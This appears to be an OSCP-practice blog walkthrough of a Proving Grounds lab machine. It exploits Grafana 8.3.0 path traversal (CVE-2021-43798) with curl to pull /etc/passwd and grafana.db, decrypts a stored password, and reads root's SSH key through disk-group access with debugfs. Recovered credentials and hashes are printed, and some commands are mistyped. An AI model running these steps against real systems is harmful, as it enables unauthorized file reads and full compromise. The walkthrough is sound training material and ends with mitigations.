---
title: Fanatastic
date: 2025-05-02
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, Grafana, CVE-2021-43798, GO, disk-group-privesc ] 
image: pg-logo.png
media_subpath: /assets/img/posts/2025-05-02-fanatastic/
---

## Introduction

In this walkthrough, I explored a PG Practice Linux machine and discovered that it was running **Grafana v8.3.0**, which is known to have a public exploit enabling **arbitrary file read via Local File Inclusion (LFI)**. I used this exploit to access the `grafana.db` database located at `/var/lib/grafana/grafana.db`. Upon examining the database, I extracted an encrypted password, which I successfully decrypted using a publicly available **Go-based decryption tool**. The credentials allowed me to SSH into the machine as the **sysadmin** user. While enumerating my privileges, I noticed that the user was part of the **disk group**, which gave me access to raw disk devices. I leveraged this to read the **root user's private SSH key** directly from disk and then used that key to establish an SSH connection as root.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22
We usually skip SSH.

## Web

### Port 3000

- Version - Grafana http

I saw a version at the bottom, searching for public exploits I found:
[ExploitDB](https://www.exploit-db.com/exploits/50581)

[Grafane Pentesting](https://exploit-notes.hdks.org/exploit/web/grafana-pentesting/)

Let’s try to read Grafana configuration file:

Reading users file I see:

```bash
curl --path-as-is http://:3000$IP/public/plugins/alertlist/../../../../../../../../etc/passwd -o passwd
```

![image.png](image%202.png)

I was able to read but it shows username and password as `admin:admin` which I already tried and it didn’t work:

![image.png](image%203.png)

Maybe default admin password is already changed and this configuration files shows just default. After a new user is created or default creds are changed: it’s stored in the grafana database which can be sqlite3 database (default, stored in `/var/lib/grafana/grafana.db`),

```bash
curl --path-as-is http://:3000$IP/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

```bash
sqlite grafana.db
sqlite> .tables
sqlite> .dump user
```

![image.png](image%204.png)

```bash
password - 63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8
salt - 0Vq2cDMrPt
```

As grafana hashes passwords differently I used [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) to convert grafana hashes to hashcat compatible format and tried to crack it.

```bash
hashcat -m 10900 grafana.hashcat --wordlist /usr/share/wordlists/rockyou.txt
```

**But it didn’t succeed.**

### Port 9090

- Version - Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

## Exploitation

Let’s look at other tables may be we can find interesting information in them.


> If you have `file.db` you can open it with sqlite command line application, or with SQLite Browser application. If it consists many tables in order to find interesting ones first open with a text editor(vim, vi) and search for keywords like `password, username, host, creds` and so on.
{: .prompt-info }

![image.png](image%205.png)

In that tables I have found basicAuth user sysadmin which is the only low-level user that has shell on the target and basicAuthPassword for that user which is base64 encoded.

When decoding it we see some non-printable characters.

![image.png](image%206.png)

I already found one go [script](https://github.com/jas502n/Grafana-CVE-2021-43798?source=post_page-----792d7014d7a0---------------------------------------) that decrypts data source password 



![image.png](image%207.png)

```bash
go run AESDecrypt.go
```

![image.png](image%208.png)

So I think we should download that package, but I encountered repeating issues during the process. Then I found a website we can just run GO scripts, [GO Playground](https://go.dev/play/) I imported there the source code and changed `DataSourcePassword` field secret key is default one.

![image.png](image%209.png)

## Credentials

```bash
sysadmin : SuperSecureP@ssw0rd
```

Let’s try that password with ssh.

![image.png](image%2010.png)

That’s it we are in.

## Privilege Escalation

I already noticed that we are in a privileged group `disk` and our name is sysadmin :). 

```bash
df -h
```

![image.png](image%2011.png)

```bash
debugfs /dev/sda2
mdkir test
cat /root/.ssh/id_rsa
```

![image.png](image%2012.png)

[Disk Privilege Escalation](https://www.hackingarticles.in/disk-group-privilege-escalation/)

[HackTricks Disk Group Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=disk#disk-group)

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@$IP
id
```

![image.png](image%2013.png)


> Add newline at the end of private key.
{: .prompt-warning }

## Mitigation

- **Update Software**: Always keep Grafana and other web applications up to date. Version 8.3.0 is outdated and contains known vulnerabilities.
- **Restrict File Permissions**: Sensitive files like `grafana.db` should have strict file permissions and not be world-readable.
- **Encrypt and Protect Credentials**: Store credentials using secure hashing (not reversible encryption) and ensure they are protected from unauthorized access.
- **Limit Group Privileges**: Avoid assigning users to privileged groups like `disk`, which allow access to raw devices and critical data.
- **Monitor for LFI Exploits**: Use web application firewalls (WAF) or intrusion detection systems (IDS) to detect and block LFI attempts.
- **Audit and Hardening**: Regularly audit group memberships and system configurations to enforce the principle of least privilege.
